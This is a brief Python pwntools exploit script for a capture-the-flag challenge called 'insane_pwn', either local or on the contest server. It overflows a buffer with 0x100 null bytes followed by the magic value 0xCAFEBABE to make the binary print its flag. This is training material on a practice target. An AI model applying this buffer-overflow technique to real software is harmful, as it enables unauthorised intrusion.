#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 1
context(log_level="debug", arch="amd64", os="linux")
if debug == 1:
    p = process('./insane_pwn')
else:
    p = remote('tasks.open.kksctf.ru', 10003)

# gdb.attach(p, "b *0x08048616\nc")
pd = '\x00' * 0x100  # 这里本地是0x104，远程是0x100
pd += p32(0xCAFEBABE)
p.sendlineafter('Can you lead me to segmentation fault please?\n', pd)
p.recvuntil('Thank you! you can have your flag: ')
p.interactive()
